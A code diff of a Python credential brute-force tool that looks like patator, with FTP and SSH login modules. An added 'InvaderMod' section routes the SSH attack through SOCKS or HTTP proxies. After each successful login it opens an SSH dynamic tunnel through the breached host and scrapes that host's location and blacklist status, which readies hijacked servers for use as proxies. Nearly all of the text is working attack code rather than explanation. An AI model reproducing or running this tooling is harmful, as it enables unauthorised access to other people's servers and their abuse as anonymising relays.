+                    it = RangeIter(typ, opt)
+                    size += len(it)
+                    ranges.append(it)
+
+                iterable = chain(*ranges)
+
+            elif t == 'PROG':
+                m = re.match(r'(.+),(\d+)$', v)
+                if m:
+                    prog, size = m.groups()
+                else:
+                    prog, size = v, sys.maxint
+
+                logger.debug('prog: %s, size: %s' % (prog, size))
+
+                it = ProgIter(prog)
+                iterable, size = chain(it), int(size)
+
+            else:
+                raise NotImplementedError("Incorrect keyword '%s'" % t)
+
+            total_size *= size
+            iterables.append(iterable)
+
+        if not iterables:
+            iterables.append(chain(['']))
+
+        if self.stop:
+            total_size = self.stop - self.start
+        else:
+            total_size -= self.start
 
         if self.resume:
-          offset = p.done_count + self.resume[i]
+            total_size -= sum(self.resume)
+
+        self.ns.total_size = total_size
+        self.ns.start_time = time()
+
+        logger.headers()
+
+        count = 0
+
+        for pp in islice(product(*iterables, cycle_index=self.cycle_index, pool_index=self.pool_index,
+                                 iter_reg=iter_reg, num_threads=self.num_threads, ns=self.ns),
+                         self.start, self.stop):
+
+            if self.ns.quit_now:
+                break
+
+            if self.pool_index is None:
+                cid = count % self.num_threads
+                prod = [str(p).strip('\r\n') for p in pp]
+            else:
+                cid = None
+                prod = []
+                for i in range(len(pp)):
+                    if i == self.pool_index:
+                        cid = pp[i][0]
+                        prod.append(str(pp[i][1]).strip('\r\n'))
+                    else:
+                        prod.append(str(pp[i]).strip('\r\n'))
+
+            if self.resume:
+                idx = count % len(self.resume)
+                off = self.resume[idx]
+
+                if count < off * len(self.resume):
+                    # logger.debug('Skipping %d %s, resume[%d]: %s' % (count, ':'.join(prod), idx, self.resume[idx]))
+                    count += 1
+                    continue
+
+            while True:
+                if self.ns.quit_now:
+                    break
+
+                try:
+                    task_queues[cid].put_nowait(prod)
+                    break
+                except Full:
+                    sleep(.1)
+
+            count += 1
+
+        if not self.ns.quit_now:
+            for q in task_queues:
+                q.put(None)
+
+        logger.debug('producer done')
+
+        while True:
+            if self.ns.quit_now:
+                for q in task_queues:
+                    q.cancel_join_thread()
+                break
+            sleep(.5)
+
+        logger.debug('producer exits')
+
+    def consume(self, task_queue, report_queue, pipe):
+
+        ignore_ctrlc()
+        handle_alarm()
+
+        global logger
+        logger = Logger(pipe)
+
+        module = self.module()
+
+        def shutdown():
+            if hasattr(module, '__del__'):
+                module.__del__()
+            logger.debug('consumer done')
+
+        while True:
+            if self.ns.quit_now:
+                return shutdown()
+
+            try:
+                prod = task_queue.get_nowait()
+            except Empty:
+                sleep(.1)
+                continue
+
+            if prod is None:
+                return shutdown()
+
+            payload = self.payload.copy()
+
+            for i, (t, _, keys) in self.iter_keys.items():
+                if t == 'FILE':
+                    for k in keys:
+                        payload[k] = payload[k].replace('FILE%d' % i, prod[i])
+                elif t == 'NET':
+                    for k in keys:
+                        payload[k] = payload[k].replace('NET%d' % i, prod[i])
+                elif t == 'COMBO':
+                    for j, k in keys:
+                        payload[k] = payload[k].replace('COMBO%d%d' % (i, j), prod[i].split(self.combo_delim)[j])
+                elif t == 'MOD':
+                    for k in keys:
+                        payload[k] = payload[k].replace('MOD%d' % i, prod[i])
+                elif t == 'RANGE':
+                    for k in keys:
+                        payload[k] = payload[k].replace('RANGE%d' % i, prod[i])
+                elif t == 'PROG':
+                    for k in keys:
+                        payload[k] = payload[k].replace('PROG%d' % i, prod[i])
+
+            for k, m, e in self.enc_keys:
+                payload[k] = re.sub(r'{0}(.+?){0}'.format(m), lambda m: e(m.group(1)), payload[k])
+
+            logger.debug('product: %s' % prod)
+            pp_prod = ':'.join(prod)
+
+            if self.check_free(payload):
+                report_queue.put(('skip', pp_prod, None, 0))
+                continue
+
+            try_count = 0
+            start_time = time()
+
+            while True:
+
+                while self.ns.paused and not self.ns.quit_now:
+                    sleep(1)
+
+                if self.ns.quit_now:
+                    return shutdown()
+
+                if self.rate_limit > 0:
+                    sleep(self.rate_limit)
+
+                if try_count <= self.max_retries or self.max_retries < 0:
+
+                    actions = {}
+                    try_count += 1
+
+                    logger.debug('payload: %s [try %d/%d]' % (payload, try_count, self.max_retries + 1))
+
+                    try:
+                        enable_alarm(self.timeout)
+                        resp = module.execute(**payload)
+
+                    except:
+                        mesg = '%s %s' % sys.exc_info()[:2]
+                        logger.debug('caught: %s' % mesg)
+
+                        # logging.exception(sys.exc_info()[1])
+
+                        resp = self.module.Response('xxx', mesg, timing=time() - start_time)
+
+                        if hasattr(module, 'reset'):
+                            module.reset()
+
+                        sleep(try_count * .1)
+                        continue
+
+                    finally:
+                        disable_alarm()
+
+                else:
+                    actions = {'fail': None}
+
+                actions.update(self.lookup_actions(resp))
+                report_queue.put((actions, pp_prod, resp, time() - start_time))
+
+                for name in self.module_actions:
+                    if name in actions:
+                        getattr(module, name)(**payload)
+
+                if 'free' in actions:
+                    self.register_free(payload, actions['free'])
+                    break
+
+                if 'fail' in actions:
+                    break
+
+                if 'retry' in actions:
+                    continue
+
+                break
+
+    def monitor_progress(self):
+        # loop until SyncManager, LogSvc and Producer are the only children left alive
+        while len(multiprocessing.active_children()) > 3 and not self.ns.quit_now:
+            self.report_progress()
+            self.monitor_interaction()
+
+    def report_progress(self):
+        for i, pq in enumerate(self.thread_report):
+            p = self.thread_progress[i]
+
+            while True:
+
+                try:
+                    actions, current, resp, seconds = pq.get_nowait()
+                    # logger.info('actions reported: %s' % '+'.join(actions))
+
+                except Empty:
+                    break
+
+                if actions == 'skip':
+                    p.skip_count += 1
+                    continue
+
+                if self.resume:
+                    offset = p.done_count + self.resume[i]
+                else:
+                    offset = p.done_count
+
+                offset = (offset * self.num_threads) + i + 1 + self.start
+
+                p.current = current
+                p.seconds[p.done_count % len(p.seconds)] = seconds
+
+                if 'fail' in actions:
+                    if not self.allow_ignore_failures or 'ignore' not in actions:
+                        logger.result('fail', resp, current, offset)
+
+                elif 'ignore' not in actions:
+                    logger.result('hit', resp, current, offset)
+
+                if 'fail' in actions:
+                    p.fail_count += 1
+
+                elif 'retry' in actions:
+                    continue
+
+                elif 'ignore' not in actions:
+                    p.hits_count += 1
+
+                    logger.save(resp, offset)
+
+                    self.push_final(resp)
+
+                p.done_count += 1
+
+                if 'quit' in actions:
+                    self.ns.quit_now = True
+
+    def monitor_interaction(self):
+
+        if on_windows():
+            import msvcrt
+            if not msvcrt.kbhit():
+                sleep(.1)
+                return
+
+            command = msvcrt.getche()
+            if command == 'x':
+                command += raw_input()
+
         else:
-          offset = p.done_count
+            i, _, _ = select([sys.stdin], [], [], .1)
+            if not i: return
+            command = i[0].readline().strip()
 
-        offset = (offset * self.num_threads) + i + 1 + self.start
-
-        p.current = current
-        p.seconds[p.done_count % len(p.seconds)] = seconds
-
-        if 'fail' in actions:
-          if not self.allow_ignore_failures or 'ignore' not in actions:
-            logger.result('fail', resp, current, offset)
-
-        elif 'ignore' not in actions:
-          logger.result('hit', resp, current, offset)
-
-        if 'fail' in actions:
-          p.fail_count += 1
-
-        elif 'retry' in actions:
-          continue
-
-        elif 'ignore' not in actions:
-          p.hits_count += 1
-
-          logger.save(resp, offset)
-
-          self.push_final(resp)
-
-        p.done_count += 1
-
-        if 'quit' in actions:
-          self.ns.quit_now = True
-
-
-  def monitor_interaction(self):
-
-    if on_windows():
-      import msvcrt
-      if not msvcrt.kbhit():
-        sleep(.1)
-        return
-
-      command = msvcrt.getche()
-      if command == 'x':
-        command += raw_input()
-
-    else:
-      i, _, _ = select([sys.stdin], [], [], .1)
-      if not i: return
-      command = i[0].readline().strip()
-
-    if command == 'h':
-      logger.info('''Available commands:
+        if command == 'h':
+            logger.info('''Available commands:
        h       show help
        <Enter> show progress
        d/D     increase/decrease debug level
@@ -1904,2605 +2105,2995 @@ Please read the README inside for more examples and usage information.
        q       terminate execution now
        ''')
 
-    elif command == 'q':
-      self.ns.quit_now = True
+        elif command == 'q':
+            self.ns.quit_now = True
 
-    elif command == 'p':
-      self.ns.paused = not self.ns.paused
-      logger.info(self.ns.paused and 'Paused' or 'Unpaused')
+        elif command == 'p':
+            self.ns.paused = not self.ns.paused
+            logger.info(self.ns.paused and 'Paused' or 'Unpaused')
 
-    elif command == 'd':
-      logger.setLevel(logging.DEBUG)
+        elif command == 'd':
+            logger.setLevel(logging.DEBUG)
 
-    elif command == 'D':
-      logger.setLevel(logging.INFO)
+        elif command == 'D':
+            logger.setLevel(logging.INFO)
 
-    elif command == 'a':
-      logger.info(repr(self.ns.actions))
+        elif command == 'a':
+            logger.info(repr(self.ns.actions))
 
-    elif command.startswith('x'):
-      _, arg = command.split(' ', 1)
-      try:
-        self.update_actions(arg)
-      except ValueError:
-        logger.warn('usage: x actions:conditions')
+        elif command.startswith('x'):
+            _, arg = command.split(' ', 1)
+            try:
+                self.update_actions(arg)
+            except ValueError:
+                logger.warn('usage: x actions:conditions')
 
-    else: # show progress
+        else:  # show progress
 
-      thread_progress = self.thread_progress
-      num_threads = self.num_threads
-      total_size = self.ns.total_size
+            thread_progress = self.thread_progress
+            num_threads = self.num_threads
+            total_size = self.ns.total_size
 
-      total_count = sum(p.done_count+p.skip_count for p in thread_progress)
-      speed_avg = num_threads / (sum(sum(p.seconds) / len(p.seconds) for p in thread_progress) / num_threads)
-      if total_size >= sys.maxint:
-        etc_time = 'inf'
-        remain_time = 'inf'
-      else:
-        remain_seconds = (total_size - total_count) / speed_avg
-        remain_time = pprint_seconds(remain_seconds, '%02d:%02d:%02d')
-        etc_seconds = datetime.now() + timedelta(seconds=remain_seconds)
-        etc_time = etc_seconds.strftime('%H:%M:%S')
+            total_count = sum(p.done_count + p.skip_count for p in thread_progress)
+            speed_avg = num_threads / (sum(sum(p.seconds) / len(p.seconds) for p in thread_progress) / num_threads)
+            if total_size >= sys.maxint:
+                etc_time = 'inf'
+                remain_time = 'inf'
+            else:
+                remain_seconds = (total_size - total_count) / speed_avg
+                remain_time = pprint_seconds(remain_seconds, '%02d:%02d:%02d')
+                etc_seconds = datetime.now() + timedelta(seconds=remain_seconds)
+                etc_time = etc_seconds.strftime('%H:%M:%S')
 
-      logger.info('Progress: {0:>3}% ({1}/{2}) | Speed: {3:.0f} r/s | ETC: {4} ({5} remaining) {6}'.format(
-        total_count * 100/total_size,
-        total_count,
-        total_size,
-        speed_avg,
-        etc_time,
-        remain_time,
-        self.ns.paused and '| Paused' or ''))
+            logger.info('Progress: {0:>3}% ({1}/{2}) | Speed: {3:.0f} r/s | ETC: {4} ({5} remaining) {6}'.format(
+                total_count * 100 / total_size,
+                total_count,
+                total_size,
+                speed_avg,
+                etc_time,
+                remain_time,
+                self.ns.paused and '| Paused' or ''))
 
-      if command == 'f':
-        for i, p in enumerate(thread_progress):
-          total_count = p.done_count + p.skip_count
-          logger.info(' {0:>3}: {1:>3}% ({2}/{3}) {4}'.format(
-            '#%d' % (i+1),
-            int(100*total_count/(1.0*total_size/num_threads)),
-            total_count,
-            total_size/num_threads,
-            p.current))
+            if command == 'f':
+                for i, p in enumerate(thread_progress):
+                    total_count = p.done_count + p.skip_count
+                    logger.info(' {0:>3}: {1:>3}% ({2}/{3}) {4}'.format(
+                        '#%d' % (i + 1),
+                        int(100 * total_count / (1.0 * total_size / num_threads)),
+                        total_count,
+                        total_size / num_threads,
+                        p.current))
+
 
 # }}}
 
 # Response_Base {{{
 def match_range(size, val):
-  if '-' in val:
-    size_min, size_max = val.split('-')
+    if '-' in val:
+        size_min, size_max = val.split('-')
 
-    if not size_min and not size_max:
-      raise ValueError('Invalid interval')
+        if not size_min and not size_max:
+            raise ValueError('Invalid interval')
 
-    elif not size_min: # size == -N
-      return size <= float(size_max)
+        elif not size_min:  # size == -N
+            return size <= float(size_max)
 
-    elif not size_max: # size == N-
-      return size >= float(size_min)
+        elif not size_max:  # size == N-
+            return size >= float(size_min)
+
+        else:
+            size_min, size_max = float(size_min), float(size_max)
+            if size_min >= size_max:
+                raise ValueError('Invalid interval')
+
+            return size_min <= size <= size_max
 
     else:
-      size_min, size_max = float(size_min), float(size_max)
-      if size_min >= size_max:
-        raise ValueError('Invalid interval')
+        return size == float(val)
 
-      return size_min <= size <= size_max
-
-  else:
-    return size == float(val)
 
 class Response_Base:
-
-  available_conditions = (
-    ('code', 'match status code'),
-    ('size', 'match size (N or N-M or N- or -N)'),
-    ('time', 'match time (N or N-M or N- or -N)'),
-    ('mesg', 'match message'),
-    ('fgrep', 'search for string in mesg'),
-    ('egrep', 'search for regex in mesg'),
+    available_conditions = (
+        ('code', 'match status code'),
+        ('size', 'match size (N or N-M or N- or -N)'),
+        ('time', 'match time (N or N-M or N- or -N)'),
+        ('mesg', 'match message'),
+        ('fgrep', 'search for string in mesg'),
+        ('egrep', 'search for regex in mesg'),
     )
 
-  indicatorsfmt = [('code', -5), ('size', -4), ('time', 7)]
+    indicatorsfmt = [('code', -5), ('size', -4), ('time', 7)]
 
-  def __init__(self, code, mesg, timing=0, trace=None):
-    self.code = code
-    self.mesg = mesg
-    self.time = timing.time if isinstance(timing, Timing) else timing
-    self.size = len(mesg)
-    self.trace = trace
+    def __init__(self, code, mesg, timing=0, trace=None):
+        self.code = code
+        self.mesg = mesg
+        self.time = timing.time if isinstance(timing, Timing) else timing
+        self.size = len(mesg)
+        self.trace = trace
 
-  def indicators(self):
-    return self.code, self.size, '%.3f' % self.time
+    def indicators(self):
+        return self.code, self.size, '%.3f' % self.time
 
-  def __str__(self):
-    return self.mesg
+    def __str__(self):
+        return self.mesg
 
-  def match(self, key, val):
-    return getattr(self, 'match_'+key)(val)
+    def match(self, key, val):
+        return getattr(self, 'match_' + key)(val)
 
-  def match_code(self, val):
-    return re.match('%s$' % val, str(self.code))
+    def match_code(self, val):
+        return re.match('%s$' % val, str(self.code))
 
-  def match_size(self, val):
-    return match_range(self.size, val)
+    def match_size(self, val):
+        return match_range(self.size, val)
 
-  def match_time(self, val):
-    return match_range(self.time, val)
+    def match_time(self, val):
+        return match_range(self.time, val)
 
-  def match_mesg(self, val):
-    return val == self.mesg
+    def match_mesg(self, val):
+        return val == self.mesg
 
-  def match_fgrep(self, val):
-    return val in str(self)
+    def match_fgrep(self, val):
+        return val in str(self)
 
-  def match_egrep(self, val):
-    return re.search(val, str(self))
+    def match_egrep(self, val):
+        return re.search(val, str(self))
 
-  def dump(self):
-    return self.trace or str(self)
+    def dump(self):
+        return self.trace or str(self)
 
 
 class Timing:
-  def __enter__(self):
-    self.t1 = time()
-    return self
+    def __enter__(self):
+        self.t1 = time()
+        return self
 
-  def __exit__(self, exc_type, exc_value, traceback):
-    self.time = time() - self.t1
+    def __exit__(self, exc_type, exc_value, traceback):
+        self.time = time() - self.t1
+
 
 # }}}
 
 # TCP_Cache {{{
 class TCP_Connection:
+    def __init__(self, fp, banner=None):
+        self.fp = fp
+        self.banner = banner
 
-  def __init__(self, fp, banner=None):
-    self.fp = fp
-    self.banner = banner
+    def close(self):
+        self.fp.close()
 
-  def close(self):
-    self.fp.close()
 
 class TCP_Cache:
-
-  available_actions = (
-    ('reset', 'close current connection in order to reconnect next time'),
+    available_actions = (
+        ('reset', 'close current connection in order to reconnect next time'),
     )
 
-  available_options = (
-    ('persistent', 'use persistent connections [1|0]'),
+    available_options = (
+        ('persistent', 'use persistent connections [1|0]'),
     )
 
-  def __init__(self):
-    self.cache = {} # {'10.0.0.1:22': ('root', conn1), '10.0.0.2:22': ('admin', conn2),
-    self.curr = None
+    def __init__(self):
+        self.cache = {}  # {'10.0.0.1:22': ('root', conn1), '10.0.0.2:22': ('admin', conn2),
+        self.curr = None
 
-  def __del__(self):
-    for _, (_, c) in self.cache.items():
-      c.close()
-    self.cache.clear()
+    def __del__(self):
+        for _, (_, c) in self.cache.items():
+            c.close()
+        self.cache.clear()
 
-  def bind(self, host, port, *args, **kwargs):
+    def bind(self, host, port, *args, **kwargs):
 
-    hp = '%s:%s' % (host, port)
-    key = ':'.join(map(str, args))
+        hp = '%s:%s' % (host, port)
+        key = ':'.join(map(str, args))
 
-    if hp in self.cache:
-      k, c = self.cache[hp]
+        if hp in self.cache:
+            k, c = self.cache[hp]
 
-      if key == k:
-        self.curr = hp, k, c
-        return c.fp, c.banner
+            if key == k:
+                self.curr = hp, k, c
+                return c.fp, c.banner
 
-      else:
-        c.close()
-        del self.cache[hp]
+            else:
+                c.close()
+                del self.cache[hp]
 
-    self.curr = None
+        self.curr = None
 
-    logger.debug('connect')
-    conn = self.connect(host, port, *args, **kwargs)
+        logger.debug('connect')
+        conn = self.connect(host, port, *args, **kwargs)
 
-    self.cache[hp] = (key, conn)
-    self.curr = hp, key, conn
+        self.cache[hp] = (key, conn)
+        self.curr = hp, key, conn
 
-    return conn.fp, conn.banner
+        return conn.fp, conn.banner
 
-  def reset(self, **kwargs):
-    if self.curr:
-      hp, _, c = self.curr
+    def reset(self, **kwargs):
+        if self.curr:
+            hp, _, c = self.curr
 
-      c.close()
-      del self.cache[hp]
+            c.close()
+            del self.cache[hp]
 
-      self.curr = None
+            self.curr = None
+
 
 # }}}
 
 # FTP {{{
 from ftplib import FTP, Error as FTP_Error
+
 try:
-  from ftplib import FTP_TLS # New in python 2.7
+    from ftplib import FTP_TLS  # New in python 2.7
 except ImportError:
-  notfound.append('ftp-tls')
+    notfound.append('ftp-tls')
+
 
 class FTP_login(TCP_Cache):
-  '''Brute-force FTP'''
+    '''Brute-force FTP'''
 
-  usage_hints = (
-    """%prog host=10.0.0.1 user=FILE0 password=FILE1 0=logins.txt 1=passwords.txt"""
-    """ -x ignore:mesg='Login incorrect.' -x ignore,reset,retry:code=500""",
+    usage_hints = (
+        """%prog host=10.0.0.1 user=FILE0 password=FILE1 0=logins.txt 1=passwords.txt"""
+        """ -x ignore:mesg='Login incorrect.' -x ignore,reset,retry:code=500""",
     )
 
-  available_options = (
-    ('host', 'target host'),
-    ('port', 'target port [21]'),
-    ('user', 'usernames to test'),
-    ('password', 'passwords to test'),
-    ('tls', 'use TLS [0|1]'),
-    ('timeout', 'seconds to wait for a response [10]'),
+    available_options = (
+        ('host', 'target host'),
+        ('port', 'target port [21]'),
+        ('user', 'usernames to test'),
+        ('password', 'passwords to test'),
+        ('tls', 'use TLS [0|1]'),
+        ('timeout', 'seconds to wait for a response [10]'),
     )
-  available_options += TCP_Cache.available_options
+    available_options += TCP_Cache.available_options
 
-  Response = Response_Base
+    Response = Response_Base
 
-  def connect(self, host, port, tls, timeout):
+    def connect(self, host, port, tls, timeout):
 
-    if tls == '0':
-      fp = FTP(timeout=int(timeout))
-    else:
-      fp = FTP_TLS(timeout=int(timeout))
+        if tls == '0':
+            fp = FTP(timeout=int(timeout))
+        else:
+            fp = FTP_TLS(timeout=int(timeout))
 
-    banner = fp.connect(host, int(port))
+        banner = fp.connect(host, int(port))
 
-    if tls != '0':
-      fp.auth()
+        if tls != '0':
+            fp.auth()
 
-    return TCP_Connection(fp, banner)
+        return TCP_Connection(fp, banner)
 
-  def execute(self, host, port='21', tls='0', user=None, password=None, timeout='10', persistent='1'):
+    def execute(self, host, port='21', tls='0', user=None, password=None, timeout='10', persistent='1'):
 
-    with Timing() as timing:
-      fp, resp = self.bind(host, port, tls, timeout=timeout)
-
-    try:
-      if user is not None or password is not None:
         with Timing() as timing:
-          if user is not None:
-            resp = fp.sendcmd('USER ' + user)
-          if password is not None:
-            resp = fp.sendcmd('PASS ' + password)
+            fp, resp = self.bind(host, port, tls, timeout=timeout)
 
-      logger.debug('No error: %s' % resp)
-      self.reset()
+        try:
+            if user is not None or password is not None:
+                with Timing() as timing:
+                    if user is not None:
+                        resp = fp.sendcmd('USER ' + user)
+                    if password is not None:
+                        resp = fp.sendcmd('PASS ' + password)
 
-    except FTP_Error as e: 
-      resp = str(e)
-      logger.debug('FTP_Error: %s' % resp)
+            logger.debug('No error: %s' % resp)
+            self.reset()
 
-    if persistent == '0':
-      self.reset()
+        except FTP_Error as e:
+            resp = str(e)
+            logger.debug('FTP_Error: %s' % resp)
 
-    code, mesg = resp.split(' ', 1)
-    return self.Response(code, mesg, timing)
+        if persistent == '0':
+            self.reset()
+
+        code, mesg = resp.split(' ', 1)
+        return self.Response(code, mesg, timing)
+
 
 # }}}
 
 # SSH {{{
 
 try:
-  from logging import NullHandler # only available since python 2.7
+    from logging import NullHandler  # only available since python 2.7
 except ImportError:
-  class NullHandler(logging.Handler):
-    def emit(self, record):
-      pass
+    class NullHandler(logging.Handler):
+        def emit(self, record):
+            pass
 
 try:
-  import paramiko 
-  logging.getLogger('paramiko.transport').addHandler(NullHandler())
+    import paramiko
+
+    logging.getLogger('paramiko.transport').addHandler(NullHandler())
 except ImportError:
-  notfound.append('paramiko')
+    notfound.append('paramiko')
+
+try:
+    import socks
+except ImportError:
+    notfound.append('pysocks')
+
+try:
+    import scrapy
+    from scrapy import signals
+    from scrapy.core.downloader.handlers.http11 import HTTP11DownloadHandler, ScrapyAgent
+    from scrapy.core.downloader.webclient import _parse
+    from scrapy.crawler import CrawlerProcess
+    from scrapy.http import Request
+    from scrapy.signalmanager import SignalManager
+    from scrapy.xlib.pydispatch import dispatcher
+    from scrapy.xlib.tx import TCP4ClientEndpoint
+    from twisted.internet import reactor
+except ImportError:
+    notfound.append('scrapy')
+
+try:
+    import pexpect
+    from pexpect import exceptions
+except ImportError:
+    notfound.append('pexpect')
+
+try:
+    if on_windows():
+        import winpexpect
+except ImportError:
+    notfound.append('winpexpect')
+
+try:
+    from txsocksx.http import SOCKS5Agent
+except ImportError:
+    notfound.append('txsocksx')
 
 def load_keyfile(keyfile):
-  for cls in (paramiko.RSAKey, paramiko.DSSKey, paramiko.ECDSAKey):
-    try:
-      return cls.from_private_key_file(keyfile)
-    except paramiko.SSHException:
-      pass
-  else:
-    raise
+    for cls in (paramiko.RSAKey, paramiko.DSSKey, paramiko.ECDSAKey):
+        try:
+            return cls.from_private_key_file(keyfile)
+        except paramiko.SSHException:
+            pass
+    else:
+        raise
 
+
+# InvaderMod
 class SSH_login(TCP_Cache):
-  '''Brute-force SSH'''
+    '''Brute-force SSH'''
 
-  usage_hints = (
-    """%prog host=10.0.0.1 user=root password=FILE0 0=passwords.txt -x ignore:mesg='Authentication failed.'""",
+    usage_hints = (
+        """%prog host=10.0.0.1 user=root password=FILE0 0=passwords.txt -x ignore:mesg='Authentication failed.'""",
     )
 
-  available_options = (
-    ('host', 'target host'),
-    ('port', 'target port [22]'),
-    ('user', 'usernames to test'),
-    ('password', 'passwords to test'),
-    ('auth_type', 'type of password authentication to use [password|keyboard-interactive|auto]'),
-    ('keyfile', 'file with RSA, DSA or ECDSA private key to test'),
+    available_options = (
+        ('host', 'target host'),
+        ('port', 'target port [22]'),
+        ('user', 'usernames to test'),
+        ('password', 'passwords to test'),
+        ('auth_type', 'type of password authentication to use [password|keyboard-interactive|auto]'),
+        ('keyfile', 'file with RSA, DSA or ECDSA private key to test'),
+        ('validate', 'create tunnel to validate connection and check IP [True]'),
+        ('proxy_type', 'type of the proxy server [SOCKS4|SOCKS5|HTTP]'),
+        ('proxy_addr', 'IP address or DNS name of the proxy server'),
+        ('proxy_port', 'port of the proxy server [1080 for socks|8080 for http]'),
+        ('proxy_rdns', 'boolean flag than modifies the behavior regarding DNS resolving (if True, DNS resolving will be \
+    preformed remotely (Socks4a, Socks5, HTTP) [True]'),
+        ('proxy_username', 'for Socks5 servers this allows simple username / password authentication, for Socks4 servers, \
+    this parameter will be sent as the userid, ignored if an HTTP server is being used'),
+        ('proxy_password', 'parameter is valid only for Socks5 servers and specifies the respective password for the \
+    username provided')
     )
-  available_options += TCP_Cache.available_options
+    available_options += TCP_Cache.available_options
 
-  Response = Response_Base
+    Response = Response_Base
 
-  def connect(self, host, port, user):
-    fp = paramiko.Transport('%s:%s' % (host, int(port)))
-    fp.start_client()
+    def connect(self, host, port, user, proxy_type=None, proxy_addr=None, proxy_port=None, proxy_rdns=True,
+                proxy_username=None, proxy_password=None):
 
-    return TCP_Connection(fp, fp.remote_version)
+        # Replace paramiko socket with socksipy object if proxy is defined.
+        if proxy_type and proxy_addr is not None:
+            sock = socks.socksocket()
+            sock.set_proxy(socks.PROXY_TYPE_SOCKS4 if proxy_type.upper() == 'SOCKS4' else socks.PROXY_TYPE_SOCKS5
+            if proxy_type.upper() == 'SOCKS5' else socks.PROXY_TYPE_HTTP, proxy_addr,
+                           int(proxy_port), proxy_rdns, proxy_username, proxy_password)
+            sock.connect((host, int(port)))
+        else:
+            sock = '%s:%s' % (host, int(port))
+        fp = paramiko.Transport(sock)
+        fp.start_client()
 
-  def execute(self, host, port='22', user=None, password=None, auth_type='password', keyfile=None, persistent='1'):
+        return TCP_Connection(fp, fp.remote_version)
 
-    with Timing() as timing:
-      fp, banner = self.bind(host, port, user)
-
-    try:
-      if user is not None:
-
-        if keyfile is not None:
-          key = load_keyfile(keyfile)
+    def execute(self, host, port='22', user=None, password=None, auth_type='password', keyfile=None, persistent='1',
+                validate='true', **proxy_params):
 
         with Timing() as timing:
+            fp, banner = self.bind(host, port, user, **proxy_params)
 
-          if keyfile is not None:
-            fp.auth_publickey(user, key)
+        try:
+            if user is not None:
 
-          elif password is not None:
-            if auth_type == 'password':
-              fp.auth_password(user, password, fallback=False)
+                if keyfile is not None:
+                    key = load_keyfile(keyfile)
 
-            elif auth_type == 'keyboard-interactive':
-              fp.auth_interactive(user, lambda a,b,c: [password] if len(c) == 1 else [])
+                with Timing() as timing:
 
-            elif auth_type == 'auto':
-              fp.auth_password(user, password, fallback=True)
+                    if keyfile is not None:
+                        fp.auth_publickey(user, key)
 
+                    elif password is not None:
+                        if auth_type == 'password':
+                            fp.auth_password(user, password, fallback=False)
+
+                        elif auth_type == 'keyboard-interactive':
+                            fp.auth_interactive(user, lambda a, b, c: [password] if len(c) == 1 else [])
+
+                        elif auth_type == 'auto':
+                            fp.auth_password(user, password, fallback=True)
+
+                        else:
+                            raise NotImplementedError("Incorrect auth_type '%s'" % auth_type)
+
+            logger.debug('No error')
+            code, mesg = '0', banner
+
+            # ------------SSH Tunneling-------------------------------
+            if validate.lower() != 'false':
+                disable_alarm()
+                from scrapy.signalmanager import SignalManager
+                from scrapy.xlib.pydispatch import dispatcher
+                from scrapy import signals
+                from pexpect import exceptions
+                local_port, ssh_tunnel = None, None
+                try:
+                    local_port, ssh_tunnel = start_tunnel(host, port, user, password, keyfile)
+                except exceptions.ExceptionPexpect as e:
+                    logger.debug('ExceptionPexpect: %s' % str(e))
+
+                if ssh_tunnel is not None:
+                    items = []
+
+                    class _Wspider(WhoerSpider):
+                        proxy = '127.0.0.1:%s' % local_port
+
+                    def get_item(item):
+                        items.append(item)
+
+                    try:
+                        SignalManager(dispatcher.Any).connect(get_item, signals.item_scraped)
+                        process = CrawlerProcess({'USER_AGENT': 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)',
+                                                  'DOWNLOAD_HANDLERS': {'http': '%s.SocksProxyDownloadHandler'
+                                                                                % os.path.basename(__file__).split('.')[
+                                                                                    0],
+                                                                        'https': '%s.SocksProxyDownloadHandler'
+                                                                                 %
+                                                                                 os.path.basename(__file__).split('.')[
+                                                                                     0]},
+                                                  'LOG_ENABLED': False})
+                        process.crawl(_Wspider)
+                        process.start()
+                        item = items.pop(0)
+                        mesg += ', country: %s, region: %s, city: %s, is black: %s' % (
+                            item['country'].encode('ascii', 'ignore'),
+                            item['region'].encode('ascii', 'ignore'),
+                            item['city'].encode('ascii', 'ignore'),
+                            item['is_black'].encode('ascii', 'ignore'))
+                    except:
+                        mesg += ", tunnel forwarded but whois service not available"
+
+                    # -------------SSH Tunneling Stop--------------------------
+                    ssh_tunnel.terminate()
+                    self.reset()
+                else:
+                    mesg += ", can't forward tunnel"
+        except paramiko.AuthenticationException as e:
+            logger.debug('AuthenticationException: %s' % str(e))
+            code, mesg = '1', str(e)
+
+        if persistent == '0':
+            self.reset()
+
+        return self.Response(code, mesg, timing)
+
+
+# Tunnelling tools {{{
+def start_tunnel(host, port, user=None, password=None, keyfile=None, max_retries=10, ):
+    if on_windows():
+        import winpexpect
+    import pexpect
+
+    local_port = 8081
+    marker = True
+    while marker and max_retries > 0:
+        if on_windows():
+            ssh_options = ''
+            if port is not None:
+                ssh_options = ssh_options + ' -P %s' % (str(port))
+            if keyfile is not None:
+                try:
+                    os.path.isfile(keyfile)
+                except:
+                    raise NotImplementedError('private ssh key does not exist')
+                ssh_options = ssh_options + ' -i %s' % (keyfile)
+            tunnel_command = '%s/plink.exe -v -C -N %s -l %s -pw %s -D 127.0.0.1:%s %s' \
+                             % (module_path().replace('\\', '/'), ssh_options, user, password, local_port, host)
+            ssh_tunnel = winpexpect.winspawn(tunnel_command)
+            index = ssh_tunnel.expect(['(?i)store key in cache?'])
+            if index is 0:
+                ssh_tunnel.sendline('y')
+            index = ssh_tunnel.expect(['Address already in use.', pexpect.TIMEOUT])
+            if index is 0:
+                ssh_tunnel.terminate()
+                local_port += 1
+                max_retries -= 1
             else:
-              raise NotImplementedError("Incorrect auth_type '%s'" % auth_type)
+                marker = False
+        else:
+            ssh_options = ''
+            if port is not None:
+                ssh_options = ssh_options + '-p %s' % (str(port))
+            if keyfile is not None:
+                try:
+                    os.path.isfile(keyfile)
+                except:
+                    raise NotImplementedError('private ssh key does not exist')
+                ssh_options = ssh_options + ' -i %s' % (keyfile)
+            tunnel_command = 'ssh -C -N -D %s %s %s@%s' % (local_port, ssh_options, user, host)
+            ssh_tunnel = pexpect.spawn(tunnel_command)
+            index = ssh_tunnel.expect(
+                ['(?i)are you sure you want to continue connecting', '(?i)(?:password)|(?:passphrase for key)'])
+            sleep(0.1)
+            sleep(60)  # Cygwin is slow to update process status.
+            if index is 0:
+                ssh_tunnel.sendline('yes')
+                index = ssh_tunnel.expect(
+                    ['(?i)are you sure you want to continue connecting', '(?i)(?:password)|(?:passphrase for key)'])
+            if index is 1:
+                ssh_tunnel.sendline(password)
